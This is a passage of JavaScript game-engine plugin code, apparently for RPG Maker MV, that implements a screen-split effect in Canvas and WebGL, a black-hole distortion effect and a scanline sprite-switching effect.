	return this._renderWebGL_split(f.ori,arguments);
});
t=[
[
undefined, // 0-0: screen center
[[1,1],[-1,1],[-1,-1],[1,-1],], // 0-1: corners
new Uint16Array([0,2,4,1,3,5,]), // 0-2: point indices for vertical split line // [0,2,4] [1,3,5]
new Float32Array([
	-1, -4,-4,
	 1, -4,-4,
	-1,  4, 4,
	 1,  4, 4,
	-1, -4,-4,
	 1,  4, 4,
]), // 0-3: point template
document.ce('canvas'), // 0-4: Canvas Mode tmpc
], // 0:
[
{
getVertexAttrib:['VERTEX_ATTRIB_ARRAY_SIZE','VERTEX_ATTRIB_ARRAY_TYPE','VERTEX_ATTRIB_ARRAY_NORMALIZED','VERTEX_ATTRIB_ARRAY_STRIDE',],
bindBuffer:['ARRAY_BUFFER','ELEMENT_ARRAY_BUFFER',],
}, // 1-0:
], // 1:
];
t[1][0].getParameter=t[1][0].bindBuffer.map(s=>(s+'_BINDING'));
new cfc(p).add('_renderCanvas_split',function f(renderFunc,argv){
	const rtv=renderFunc.apply(this,argv);
	this._renderCanvas_splitTest(renderFunc,argv);
	this._renderCanvas_splits(renderFunc,argv);
	return rtv;
},undefined,true,true).add('_renderCanvas_splitTest',function f(renderFunc,argv){
	return this._renderCanvas_split1(this._render_splitInfo_getTest(),renderFunc,argv);
},undefined,true,true).add('_renderCanvas_splits',function f(renderFunc,argv){
	const arr=this._render_splitInfo_getCont(),PI_2=Math.PI*0.5;
	for(let x=0,xs=arr.length;x!==xs;++x){
		const info=arr[x];
		const r=Math.sin(Math.min(1,info.dur/info.durMax)*PI_2);
		this._renderCanvas_split1({pt:info.pt,slope:info.slope,width:r*info.widthMax,height:r*info.heightMax,},renderFunc,argv);
	}
},undefined,true,true).add('_renderCanvas_split1',function f(opt,renderFunc,argv){
	// return -1 if fail
	opt=opt||{};
	if(!f.tbl[0]) f.tbl[0]={x:Graphics.boxWidth>>1,y:Graphics.boxHeight>>1,};
	const pt=opt.pt||f.tbl[0],slope=opt.slope||0,width=opt.width||0,height=opt.height||0;
	if(!width&&!height) return -1;
	
	const renderer=argv[0];
	const ctx=renderer.context;
	const c=ctx.canvas,tmpc=f.tbl[4];
	tmpc.width=c.width; tmpc.height=c.height;
	const tmpctx=tmpc.getContext('2d');
	tmpctx.drawImage(c,0,0);
	c.height=c.height; // clear
	
	const isInf=1/slope===0;
	const points=isInf?
		[[pt.x,0],[pt.x,Graphics.boxHeight],]:
		[[0,pt.y-pt.x*slope],[Graphics.boxWidth,pt.y+(Graphics.boxWidth-pt.x)*slope],];
	{
		points.length=2;
		if(isInf){
			const x=slope<0?0:Graphics.boxWidth;
			points.push([x,Graphics.boxHeight]);
			points.push([x,0]);
		}else{
			if(0<points.back[1]) points.push([Graphics.boxWidth,0]);
			if(0<points[0][1]) points.push([0,0]);
		}
		this._renderCanvas_clipByPath(ctx,tmpctx,points,-width,-height,renderFunc,argv);
	}
	{
		points.length=2;
		if(isInf){
			const x=slope<0?Graphics.boxWidth:0;
			points.push([x,Graphics.boxHeight]);
			points.push([x,0]);
		}else{
			if(points.back[1]<Graphics.boxHeight) points.push([Graphics.boxWidth,Graphics.boxHeight]);
			if(points[0][1]<Graphics.boxHeight) points.push([0,Graphics.boxHeight]);
		}
		this._renderCanvas_clipByPath(ctx,tmpctx,points,width,height,renderFunc,argv);
	}
},t[0],true,true).add('_renderCanvas_clipByPath',function f(ctx,tmpctx,points,dx,dy,renderFunc,argv){
	// save before clipping
	ctx.save();
	ctx.transform.apply(ctx,[1,0,0,1,dx,dy,]);
	ctx.beginPath();
	ctx.moveTo(points[0][0],points[0][1]);
	for(let i=1,sz=points.length;i!==sz;++i) ctx.lineTo(points[i][0],points[i][1]);
	ctx.clip();
	ctx.drawImage(tmpctx.canvas,0,0);
	//ctx.resetTransform(); // restored by ctx.restore();
	// restore clipping
	ctx.restore();
}).add('_renderWebGL_split',function f(renderFunc,argv){
	const gl=argv&&argv[0]&&argv[0].gl; if(!gl) return;
	const rtv=renderFunc.apply(this,argv);
	const oldShaderInfo=this._renderWebGL_split_saveShader(gl);
	this._renderWebGL_split_applySplitShaderTest(gl,renderFunc,argv);
	this._renderWebGL_split_applySplitShaders(gl,renderFunc,argv);
	this._renderWebGL_split_restoreShader(gl,oldShaderInfo);
	return rtv;
}).add('_renderWebGL_split_saveShader',function f(gl){
	const info={
		getParameter:[],getVertexAttrib:[],
		getVertexAttrib:[],
	};
	for(let x=0,arr=f.tbl[0].getParameter,xs=arr.length;x!==xs;++x) info.getParameter.push(gl.getParameter(gl[arr[x]]));
	const prog=info.CURRENT_PROGRAM=gl.getParameter(gl.CURRENT_PROGRAM);
	// get attribute infos
	const cnt=info.ACTIVE_ATTRIBUTES=gl.getProgramParameter(prog,gl.ACTIVE_ATTRIBUTES);
	for(let i=0;i!==cnt;++i){
		const attr=gl.getActiveAttrib(prog,i);
		if(!attr){ info.getVertexAttrib.push(undefined); continue; }
		const vertexAttrs=[],idx=gl.getAttribLocation(prog,attr.name);
		vertexAttrs.push(vertexAttrs._idx=idx);
		for(let x=0,arr=f.tbl[0].getVertexAttrib,xs=arr.length;x!==xs;++x) vertexAttrs.push(gl.getVertexAttrib(idx,gl[arr[x]]));
		vertexAttrs.push(vertexAttrs._offset=gl.getVertexAttribOffset(idx,gl.VERTEX_ATTRIB_ARRAY_POINTER));
		info.getVertexAttrib.push(vertexAttrs);
	}
	return info;
},t[1],true,true).add('_renderWebGL_split_applySplitShaderTest',function f(gl,renderFunc,argv){
	return this._renderWebGL_split_applySplitShader1(this._render_splitInfo_getTest(),gl,renderFunc,argv);
},t[1],true,true).add('_renderWebGL_split_applySplitShaders',function f(gl,renderFunc,argv){
	const arr=this._render_splitInfo_getCont(),PI_2=Math.PI*0.5;
	for(let x=0,xs=arr.length;x!==xs;++x){
		const info=arr[x];
		const r=Math.sin(Math.min(1,info.dur/info.durMax)*PI_2);
		this._renderWebGL_split_applySplitShader1({pt:info.pt,slope:info.slope,width:r*info.widthMax,height:r*info.heightMax,},gl,renderFunc,argv);
	}
},t[1],true,true).add('_renderWebGL_split_applySplitShader1',function f(opt,gl,renderFunc,argv){
	opt=opt||{};
	if(!f.tbl[0]) f.tbl[0]={x:Graphics.boxWidth>>1,y:Graphics.boxHeight>>1,_W2:2.0/Graphics.boxWidth,_H2:-2.0/Graphics.boxHeight,r:Graphics.boxHeight/Graphics.boxWidth};
	const pt=opt.pt||f.tbl[0],slope=-opt.slope||0,width=opt.width||0,height=opt.height||0;
	if(!width&&!height) return;
	
	const shaderInfo=this._renderWebGL_split_getSplitShader(gl); if(!shaderInfo) return;
	
	const isInf=1/slope===0;
	const vecT=isInf?[1,0]:[slope*f.tbl[0]._H2,f.tbl[0]._W2]; // scaled, then turning PI/2, cmp in shader
	const ptx=pt.x*f.tbl[0]._W2-1;
	const pty=pt.y*f.tbl[0]._H2+1;
	
	const attrCnt_dir=1,attrCnt_point=2;
	const attrsCnt=attrCnt_dir+attrCnt_point;
	const ab_idxv=f.tbl[2].slice();
	const ab_data=f.tbl[3].slice();
	{
		const c=-(ptx*vecT[0]+pty*vecT[1]);
		const dirs=[]; for(let x=0,arr=f.tbl[1],xs=arr.length;x!==xs;++x) dirs.push(vecT[0]*arr[x][0]+vecT[1]*arr[x][1]+c);
		const slopeAbs=Math.abs(slope);
		if(f.tbl[0].r<slopeAbs){ // almost vertical
			const xOverY=vecT[1]/vecT[0],cOverVecT0=-c/vecT[0];
			const x0=cOverVecT0+xOverY,x1=cOverVecT0-xOverY;
			/*
			const x0=-(c-vecT[1])/vecT[0]; // y=-1
			const x1=-(c+vecT[1])/vecT[0]; // y=1
			*/
			const dx=(x1-x0)*0.5;
			if(0<slope){ for(let x=0,xs=ab_data.length;x<xs;x+=attrsCnt) ab_data[x]=-ab_data[x]; }
			ab_data[ 1]=ab_data[ 4]=x0-dx*3;
			ab_data[ 7]=ab_data[10]=x1+dx*3;
			ab_data[14]=ab_data[17]=0;
			// ab_points=new Float32Array([[x0-dx*3,-4],[x1+dx*3,4],[-4,0],[4,0]].flat());
			//ab_data[1]=1; ab_data[2]=1; ab_data[4]=0; ab_data[5]=1; ab_data[7]=0; ab_data[8]=0; ab_data[10]=1; ab_data[11]=0; // debug test
		}else{ // almost horizontal
			const yOverX=vecT[0]/vecT[1],cOverVecT1=-c/vecT[1];
			const y0=cOverVecT1-yOverX,y1=cOverVecT1+yOverX;
			/*
			const y0=-(c-vecT[0])/vecT[1]; // x=-1
			const y1=-(c+vecT[0])/vecT[1]; // x=1
			*/
			const dy=(y1-y0)*0.5;
			ab_data[ 2]=ab_data[ 5]=y0-dy*3;
			ab_data[ 8]=ab_data[11]=y1+dy*3;
			ab_data[13]=ab_data[16]=0;
			// ab_points=new Float32Array([[-4,y0-dy*3],[4,y1+dy*3],[0,-4],[0,4]].flat());
		}
	}
	
	gl.bindTexture(gl.TEXTURE_2D,shaderInfo.texture);
	const refc=Graphics._canvas;
	gl.copyTexImage2D(gl.TEXTURE_2D,0,gl.RGBA,0,0,refc.width,refc.height,0);
	gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
	gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
	gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
	
	const prog=shaderInfo.prog;
	gl.useProgram(prog);
	
	gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, shaderInfo.glbuf_i);
	gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, ab_idxv, gl.STATIC_DRAW);
	gl.bindBuffer(gl.ARRAY_BUFFER, shaderInfo.glbuf);
	gl.bufferData(gl.ARRAY_BUFFER, ab_data, gl.STATIC_DRAW);
	
	const loc_dxy=gl.getUniformLocation(prog,"u_dxy");
	gl.uniform2f(loc_dxy,width*f.tbl[0]._W2,height*f.tbl[0]._H2);
	const loc_tex=gl.getUniformLocation(prog,"u_texture");
	gl.uniform1i(loc_tex,0);
	
	const loc_dir=gl.getAttribLocation(prog,"a_dir");
	const loc_pxy=gl.getAttribLocation(prog,"a_pxy");
	if(!shaderInfo.enabled){
		shaderInfo.enabled=true;
		gl.enableVertexAttribArray(loc_dir);
		gl.enableVertexAttribArray(loc_pxy);
	}
	gl.vertexAttribPointer(loc_dir, 1, gl.FLOAT, false, attrsCnt * Float32Array.BYTES_PER_ELEMENT, 0);
	gl.vertexAttribPointer(loc_pxy, 2, gl.FLOAT, false, attrsCnt * Float32Array.BYTES_PER_ELEMENT, 4);
	
	gl.clearColor(0.0, 0.0, 0.0, 0.0);
	gl.clear(gl.COLOR_BUFFER_BIT);
	gl.drawElements(gl.TRIANGLES, ab_idxv.length, gl.UNSIGNED_SHORT, 0);
},t[0]).add('_renderWebGL_split_getSplitShader',function f(gl){
	const progInfo=f.tbl[0]; if(progInfo.prog) return progInfo;
	
	const shaderV=progInfo.shaderV||(progInfo.shaderV=gl.createShader(gl.VERTEX_SHADER));
	const shaderF=progInfo.shaderF||(progInfo.shaderF=gl.createShader(gl.FRAGMENT_SHADER));
	
	gl.shaderSource(shaderV, progInfo.shaderSrcV);
	gl.shaderSource(shaderF, progInfo.shaderSrcF);
	
	gl.compileShader(shaderV);
	gl.compileShader(shaderF);
	
	const prog=progInfo.prog=gl.createProgram();
	gl.attachShader(prog, shaderV); 
	gl.attachShader(prog, shaderF);
	gl.linkProgram(prog);
	
	gl.deleteShader(shaderV);
	gl.deleteShader(shaderF);
	
	if(!progInfo.glbuf){
		progInfo.glbuf   =gl.createBuffer();
		progInfo.glbuf_i =gl.createBuffer();
		progInfo.texture =gl.createTexture();
	}
	
	return progInfo;
},[
{
shaderSrcV:"precision lowp float;\n\nuniform vec2 u_dxy;\n\nattribute float a_dir;\nattribute vec2 a_pxy;\n\nvarying vec2 v_texcoord,v_dxy;\n\nvoid main(){\n\tgl_Position=vec4((a_dir<0.0?u_dxy:-u_dxy)+a_pxy,1.0,1.0); v_texcoord=(a_pxy+1.0)*0.5; v_dxy=a_dir<0.0?u_dxy:-u_dxy; \n}\n",
shaderSrcF:"precision lowp float;\n\nuniform sampler2D u_texture;\n\nvarying vec2 v_texcoord,v_dxy;\n\nvoid main(){\n\tif(v_texcoord.x<0.0||1.0<v_texcoord.x||v_texcoord.y<0.0||1.0<v_texcoord.y) gl_FragColor.xyz=vec3(0.0,0.0,0.0); else gl_FragColor=texture2D(u_texture,v_texcoord); \n}",
shaderV:undefined,
shaderF:undefined,
prog:undefined,
glbuf:undefined,
glbuf_i:undefined,
texture:undefined,
enabled:false,
}
]).add('_renderWebGL_split_restoreShader',function f(gl,info){
	if(!info) return;
	gl.useProgram(info.CURRENT_PROGRAM);
	for(let arr=f.tbl[0].bindBuffer,x=arr.length;x--;) gl.bindBuffer(gl[arr[x]], info.getParameter[x], gl.STATIC_DRAW);
	for(let i=0,arrv=info.getVertexAttrib,sz=arrv.length;i!==sz;++i) if(arrv[i]) gl.vertexAttribPointer.apply(gl,arrv[i]);
},t[1],undefined,true,true);
new cfc(p).add('_render_splitInfo_getTest',function f(){
	return ({pt:this._splitPoint,slope:this._splitSlope,width:this._splitWidth,height:this._splitHeight,});
},undefined,true,true).add('render_splitInfo_add',function f(order,dur,holdDur,ptx,pty,slope,width,height,endFlashDur,endFlashColor){
	const info={
		order:order,
		dur:0,
		durMax:dur,
		durTotal:dur+holdDur,
		pt:{x:ptx,y:pty},
		slope:slope,
		widthMax:width,
		heightMax:height,
		endFlashDur:endFlashDur,
		endFlashColor:Array.from(endFlashColor||[]),
		shouldReset:false,
	};
	if(!(0<info.durMax)||!(0<info.durTotal)) return;
	this._render_splitInfo_getCont().push(info);
	return info;
},undefined,true,true).add('_render_splitInfo_getCont',function f(){
	let rtv=this._splitInfos; if(!rtv) rtv=this._splitInfos=[];
	return rtv;
},undefined,true,true).add('_render_splitInfo_getSorted',function f(){
	return this._render_splitInfo_getCont().sort(f.tbl[0]);
},[
(a,b)=>a.order-b.order,
],true,true).add('render_splitInfo_clear',function f(){
	this._render_split_getInfos().length=0;
},undefined,true,true).add('update_splitInfo',function f(){
	const cont=this._render_splitInfo_getSorted(),keep=[];
	for(let x=0,xs=cont.length;x!==xs;++x){
		const info=cont[x];
		if(info.shouldReset) continue;
		if(info.dur<info.durTotal) ++info.dur;
		else{ info.shouldReset=true; $gameScreen.startFlash(info.endFlashColor,info.endFlashDur); }
		keep.push(info);
	}
	if(keep.length!==cont.length){ cont.length=0; cont.concat_inplace(keep); }
},undefined,true,true).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.update_splitInfo();
	return rtv;
});


new cfc(SceneManager).add('splittedRenderedSpriteset_start',function f(dur,holdDur,ptx,pty,slope,width,height,endFlashDur,endFlashColor){
	const sc=this._scene;
	const sps=sc&&sc._spriteset; if(!sps) return;
	sps._splitDur=0;
	sps._splitDurMax=dur;
	sps._splitDurTotal=dur+holdDur;
	sps._splitPoint={x:ptx,y:pty};
	sps._splitSlope=slope;
	sps._splitWidthMax=width;
	sps._splitHeightMax=height;
	sps._splitEndFlashDur=endFlashDur;
	sps._splitEndFlashColor=Array.from(endFlashColor||[]);
},undefined,true,true).add('splittedRenderedSpriteset_gen',function f(order,dur,holdDur,ptx,pty,slope,width,height,endFlashDur,endFlashColor){
	const sc=this._scene;
	const sps=sc&&sc._spriteset; if(!sps) return;
	return sps.render_splitInfo_add.apply(sps,arguments);
}).add('splittedRenderedSpriteset_update',function f(){
	const sc=this._scene;
	const sps=sc&&sc._spriteset; if(!sps) return;
	if(this._splittedRenderedSpriteset_shouldReset){ this._splittedRenderedSpriteset_shouldReset=false; sps._splitHeight=sps._splitWidth=0; }
	if(!(0<sps._splitDurMax)||!(0<sps._splitDurTotal)) return;
	if(!(sps._splitDur<sps._splitDurTotal)){
		sps._splitDurTotal=0;
		if(sps._splitEndFlashColor) $gameScreen.startFlash(sps._splitEndFlashColor,sps._splitEndFlashDur);
		this._splittedRenderedSpriteset_shouldReset=true;
		return;
	}
	const r=Math.sin(Math.min(1,++sps._splitDur/sps._splitDurMax)*(Math.PI/2));
	sps._splitWidth=r*sps._splitWidthMax;
	sps._splitHeight=r*sps._splitHeightMax;
}).add('updateScene',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.splittedRenderedSpriteset_update();
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 黑洞v2
 * @author agold404
 * @help Graphics.renderBlackholeEffectSettings_add(
    2048,4,32,{
        x:Graphics.width*3/4-32,
        y:Graphics.height/4,
        rad:256,
        dHyperbolaC:1.0/1024,
        dRotate:0.75,
        absorbDelay:123,
        rotateDelay:8,
    }
);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Graphics).add('renderOtherEffects',function f(){
	this.renderBlackholeEffects();
	return f.ori.apply(this,arguments);
}).add('renderBlackholeEffects',function f(){
	const arr=this.renderBlackholeEffectSettings_get(); if(!arr.length&&!this._renderBlackholeEffect_isRendered) return;
	let dstC=this._renderBlackholeEffectDst; if(!dstC) document.body.ac(dstC=this._renderBlackholeEffectDst=document.ce('canvas').sa('style',Graphics._canvas.ga('style')));
	let mskC=this._renderBlackholeEffectMsk; if(!mskC)                  mskC=this._renderBlackholeEffectMsk=document.ce('canvas');
	const mskCtx=this._renderBlackholeEffectMskCtx=mskC.getContext('2d');
	const dstCtx=this._renderBlackholeEffectDstCtx=dstC.getContext('2d',f.tbl[0]);
	{
		const rawC=Graphics._canvas;
		const rawCtx=rawC.getContext('2d',f.tbl[0]);
		const shiftBitsNeeded=(~~(arr.reduce(f.tbl[1],0)/f.tbl[2])).toString(2).length;
		const shr=this._renderBlackholeEffectShr=Math.min(f.tbl[3],shiftBitsNeeded,);
		dstC.width=mskC.width=rawC.width>>shr;
		this._renderBlackholeEffect_isRendered=false;
		const H=rawC.height>>shr; if(H!==dstC.height) dstC.height=mskC.height=H;
		dstCtx.drawImage(rawC,0,0,rawC.width,rawC.height,0,0,dstC.width,dstC.height);
	}
	this._renderBlackholeEffectDstData=dstCtx.getImageData(0,0,dstC.width,dstC.height);
	this._renderBlackholeEffectMskData=mskCtx.getImageData(0,0,mskC.width,mskC.height);
	
	arr.forEach(this.renderBlackholeEffect1,(this));
	const keep=[]; arr.forEach(f.tbl[4],(keep));
	if(keep.length!==arr.length){ arr.length=0; arr.concat_inplace(keep); }
	
	mskCtx.putImageData(this._renderBlackholeEffectMskData,0,0);
	dstCtx.putImageData(this._renderBlackholeEffectDstData,0,0);
	dstCtx.save();
	dstCtx.globalCompositeOperation="destination-atop";
	dstCtx.drawImage(mskC,0,0);
	dstCtx.restore();
},[
{imageSmoothingEnabled:true,imageSmoothingQuality:"high",}, // 0: context setting
(r,state)=>r+(state.setting&&state.setting.rad*state.setting.rad-0||0), // 1: reduce: sum total area
1<<15, // 2: shift oneMoreBit threshold
0|3, // 3: max shift bits
function(state){ if(state.dur<state.durTotal) this.push(state); }, // 4: keep
]).add('renderBlackholeEffectSettings_get',function f(){
	let rtv=this._renderBlackholeEffectSettings; if(!rtv) rtv=this._renderBlackholeEffectSettings=[];
	return rtv;
}).add('renderBlackholeEffectSettings_add',function f(totalDur,fadeInDur,fadeOutDur,holeSetting){
	totalDur|=0;
	fadeInDur|=0; if(fadeInDur<0) fadeInDur=0;
	fadeOutDur|=0; if(fadeOutDur<0) fadeOutDur=0;
	if(!(0<totalDur)||totalDur<fadeInDur+fadeOutDur) return -1;
	const info={
		dur:0,
		durTotal:totalDur,
		durFadeOut:fadeOutDur,
		frameFadeIn:fadeInDur,
		frameFadeOutStart:totalDur-fadeOutDur,
		setting:holeSetting,
	};
	this.renderBlackholeEffectSettings_get().push(info);
	return info;
}).add('renderBlackholeEffect1',function f(state,i){
	const setting=state.setting;
	if(!setting) return; // setting is also state
	if(!(state.lastFrame<Graphics.frameCount)) state.lastFrame=Graphics.frameCount-1;
	const df=Graphics.frameCount-state.lastFrame||0; state.lastFrame=Graphics.frameCount;
	state.dur+=df;
	const alpha=(state.dur<state.frameFadeIn?state.dur/state.frameFadeIn:(state.frameFadeOutStart<state.dur?(state.durTotal-state.dur)/state.durFadeOut:1))||0;
	const alpha_1=1-alpha;
	
	const mskData=this._renderBlackholeEffectMskData;
	const dstData=this._renderBlackholeEffectDstData;
	const shr=this._renderBlackholeEffectShr;
	const radRaw=setting.rad-0||0;
	const followXy=setting.follow?(setting.follow.getGlobalPosition?setting.follow.getGlobalPosition():({x:setting.follow.x,y:setting.follow.y})):({x:0,y:0});
	const xRaw=(setting.x-0||0)+(followXy.x-0||0);
	const yRaw=(setting.y-0||0)+(followXy.y-0||0);
	const N=1<<shr;
	const ox=xRaw/N;
	const oy=yRaw/N;
	const rad0=radRaw/N;
	const rad2=rad0*rad0;
	const xMin0=~~Math.max(0,ox-rad0-1),xMax0=~~Math.min(dstData.width-1,ox+rad0+1);
	const yMin0=~~Math.max(0,oy-rad0-1),yMax0=~~Math.min(dstData.height-1,oy+rad0+1);
	const dRotate=setting.dRotate-0||0;
	const rotateDelay=setting.rotateDelay-0||0;
	const dHyperbolaC=setting.dHyperbolaC-0||0;
	const absorbDelay=setting.absorbDelay-0||0;
	const rotateRate=setting.rotateRate-0||0;
	
	if(!setting.rotate) setting.rotate=0;
	if(rotateDelay<state.dur) setting.rotate+=dRotate;
	if(!setting.hyperbolaC) setting.hyperbolaC=0;
	if(absorbDelay<state.dur) setting.hyperbolaC+=dHyperbolaC;
	
	const srcData=dstData.data.slice();
	const rotC=Math.PI/180;
	for(let y=yMin0,tmp;y<=yMax0;++y){ for(let x=xMin0;x<=xMax0;++x){
		const dx=x-ox,dy=y-oy;
		const r2=dx*dx+dy*dy; if(!r2||r2>=rad2) continue;
		const idxB=(y*dstData.width+x)<<2;
		const r1=Math.sqrt(r2);
		const distRate=r1/rad0;
		const rate1=Math.sqrt(setting.hyperbolaC+distRate*distRate);
		const rate=Math.min(rate1,1)/r1*rad0;
		const sx0=dx*rate,sy0=dy*rate;
		tmp=1-distRate;
		const rot=rotC*setting.rotate*(tmp*tmp*tmp);
		const cos=Math.cos(rot),sin=Math.sin(rot);
		const sx1=cos*sx0-sin*sy0,sy1=sin*sx0+cos*sy0;
		
		const sx2=sx1+ox,sy2=sy1+oy;
		const scale=Math.min(sx2.clamp(xMin0,xMax0)/sx2,sy2.clamp(yMin0,yMax0)/sy2);
		const sx3=sx2*scale,sy3=sy2*scale;
		const sx3f=Math.floor(sx3),sx3c=Math.ceil(sx3);
		const sy3f=Math.floor(sy3),sy3c=Math.ceil(sy3);
		const rx=sx3-sx3f,ry=sy3-sy3f;
		const idx3v=[
			(sy3f*dstData.width+sx3f)<<2,
			(sy3f*dstData.width+sx3c)<<2,
			(sy3c*dstData.width+sx3f)<<2,
			(sy3c*dstData.width+sx3c)<<2,
		],rv=[
			(1-rx)*(1-ry),
			(  rx)*(1-ry),
			(1-rx)*(  ry),
			(  rx)*(  ry),
		];
		
		for(let c=4;c--;){
			tmp=0; /* if(1<rate1) tmp=c===3?255:0; else */ for(let t=rv.length;t--;) tmp+=srcData[idx3v[t]|c]*rv[t];
			dstData.data[idxB|c]=srcData[idxB|c]*alpha_1+tmp*alpha;
		}
		mskData.data[idxB|3]=Math.max(mskData.data[idxB|3],255*alpha);
	} }
	this._renderBlackholeEffect_isRendered=true;
});

new cfc(Sprite.prototype).add('renderBlackholeEffectSettings_add',function f(totalDur,fadeInDur,fadeOutDur,holeSetting){
	if(!holeSetting) return;
	const info={}; for(let k in holeSetting) info[k]=holeSetting[k];
	info.follow=this;
	return Graphics.renderBlackholeEffectSettings_add(totalDur,fadeInDur,fadeOutDur,info);
});

new cfc(Game_Actor.prototype).add('renderBlackholeEffectSettings_add',function f(totalDur,fadeInDur,fadeOutDur,holeSetting){
	const sc=SceneManager._scene;
	const m=sc&&sc._btlr2sp;
	const sp=m&&m.get(this); if(!sp) return;
	return sp.renderBlackholeEffectSettings_add.apply(sp,arguments);
});

new cfc(Game_Character.prototype).add('renderBlackholeEffectSettings_add',function f(totalDur,fadeInDur,fadeOutDur,holeSetting){
	const sc=SceneManager._scene;
	const m=sc&&sc._chr2sp;
	const sp=m&&m.get(this); if(!sp) return;
	return sp.renderBlackholeEffectSettings_add.apply(sp,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc 掃描線換圖
 * @author agold404
 * @help $gameActors._data[1].getSprite().switchToBmp_hLine(ImageManager.loadNormalBitmap('img/sv_actors/Actor2_4.png'),123,123,-123);
 * $gameTroop.members()[0].getSprite().switchToBmp_vLine(ImageManager.loadNormalBitmap('img/sv_enemies/Pillar.png'),123,-234,234);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

(t=function f(){ return this.parent&&f.ori.apply(this,arguments); }).ori=Sprite.prototype.refresh_do;
new cfc(PIXI.Container.prototype).add('drawMask_set',function f(x,y,width,height){
	const info={x:x|0,y:y|0,w:width|0,h:height|0};
	const isInvalid=!(info.w>=0)||!(info.h>=0);
	if(Graphics.isWebGL()) return this.drawMask_set_WebGL(info,isInvalid);
	if(isInvalid) return this._drawMask=undefined;
	return this._drawMask=info;
}).add('drawMask_set_WebGL',function f(info,isInvalid){
	if(!PIXI.Container._bmp1x1) (PIXI.Container._bmp1x1=new Bitmap(1,1)).fillAll(f.tbl[0]);
	if(this.mask){ this.removeChild(this.mask); this.mask=null; }
	if(this._drawMaskSp) this._drawMaskSp.destroy();
	if(isInvalid) return;
	this.addChild(this._drawMaskSp=new Sprite(PIXI.Container._bmp1x1));
	const msk=this._drawMaskSp;
	if(this.mask!==msk){
		msk.refresh_do=f.tbl[1];
		msk.position.set(info.x,info.y);
		msk.scale.set(info.w,info.h);
		this.mask=msk;
	}
	return this._drawMask=info;
},[
'#FFFFFF',
t,
]).add('drawMask_clear',function f(){
	this._drawMask=undefined;
	if(Graphics.isWebGL()) this.drawMask_set_WebGL(undefined,true);
}).add('renderCanvas',function f(renderer){
	return this.renderCanvas_drawMask(f.ori,arguments);
}).add('renderCanvas_drawMask',function f(renderFunc,argv){
	const conf=this._drawMask;
	const renderer=argv[0]; if(!renderer||!conf) return renderFunc.apply(this,argv);
	const ctx=renderer.context;
	const p0=this.toGlobal({x:conf.x,y:conf.y}),p1=this.toGlobal({x:conf.x+conf.w,y:conf.y+conf.h});
	const t=ctx.getTransform();
	ctx.save(); // save before clipping
	ctx.setTransform(1,0,0,1,1,1);
	ctx.beginPath();
	ctx.moveTo(p0.x,p0.y);
	ctx.lineTo(p1.x,p0.y);
	ctx.lineTo(p1.x,p1.y);
	ctx.lineTo(p0.x,p1.y);
	ctx.clip();
	ctx.setTransform(t.a,t.b,t.c,t.d,t.e,t.f);
	const rtv=renderFunc.apply(this,argv);
	ctx.restore(); // restore clipping
	return rtv;
});

new cfc(Sprite.prototype).add('_switchToBmp_defaultCallback',(self,info)=>{
	if(info.keep) return;
	self.bitmap=info.sp.bitmap;
	info.sp.destroy();
	self.drawMask_clear();
	self._switchToBmp_splitInfo=undefined;
}).add('_switchToBmp',function f(direction,newBmp,dur,from,to,willKeep,callback_this_info){
	if(!this.parent) return;
	if(this._switchToBmp_sp) this._switchToBmp_sp.destroy();
	const info=this._switchToBmp_splitInfo={
		dur:0,
		durMax:dur,
		dir:direction,
		from:from,
		to:to,
		sp:new Sprite(newBmp),
		bmpWH:undefined,
		keep:willKeep,
		callback:callback_this_info||this._switchToBmp_defaultCallback,
	};
	newBmp.addLoadListener(f.tbl[0].bind(info));
	if(this._switchToBmp_spLast) this.removeChild(this._switchToBmp_spLast);
	this.parent.addChild(this._switchToBmp_spLast=info.sp);
	this.switchToBmp_updateNewBitmapSprite(info);
	return info;
},[
function(bmp){ this.bmpWH={W:bmp.width,H:bmp.height,}; }, // 0: tell w,h
]).add('switchToBmp_updateNewBitmapSprite',function f(info){
	for(let x=0,arr=f.tbl[0],xs=arr.length;x!==xs;++x){
		const attr=this[arr[x]];
		info.sp[arr[x]].set(attr.x,attr.y);
	}
	this.switchToBmp_updateFrame(info);
},[
['position','scale','anchor',],
]).add('switchToBmp_updateFrame',function f(info,frm,bmp){
	frm=frm||this._frame;
	bmp=bmp||this.bitmap;
	if(bmp&&info.bmpWH){
		const rx0=frm.x/bmp.width,rx1=(frm.x+frm.width)/bmp.width;
		const ry0=frm.y/bmp.height,ry1=(frm.y+frm.height)/bmp.height;
		const x=info.bmpWH.W*rx0;
		const y=info.bmpWH.H*ry0;
		info.sp.setFrame(x,y,info.bmpWH.W*rx1-x,info.bmpWH.H*ry1-y);
	}else info.sp.setFrame(frm.x,frm.y,frm.width,frm.height);
}).add('switchToBmp_vLine',function f(newBmp,dur,from,to,willKeep,callback){
	return this._switchToBmp('x',newBmp,dur,from,to,willKeep,callback);
}).add('switchToBmp_hLine',function f(newBmp,dur,from,to,willKeep,callback){
	return this._switchToBmp('y',newBmp,dur,from,to,willKeep,callback);
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.update_switchToBmp();
	return rtv;
}).add('update_switchToBmp',function f(){
	const info=this._switchToBmp_splitInfo;
	if(!info||!(++info.dur<info.durMax)) return info&&info.sp&&info.callback&&info.callback(this,info);
	const key=f.tbl[0][info.dir];
	if(key) this[key](info,(info.dur/info.durMax)*(info.to-info.from)+info.from);
	this.switchToBmp_updateNewBitmapSprite(info);
},[
{x:'_update_switchToBmp_x',y:'_update_switchToBmp_y'},
]).add('_update_switchToBmp_x',function f(info,d){
	const x=d;
	const H=Graphics.height;
	if(info.to<info.from){
		info.sp.drawMask_set(x,-H,info.from-x,H<<1);
		this.drawMask_set(info.to,-H,x-info.to,H<<1);
	}else{
		info.sp.drawMask_set(info.from,-H,x-info.from,H<<1);
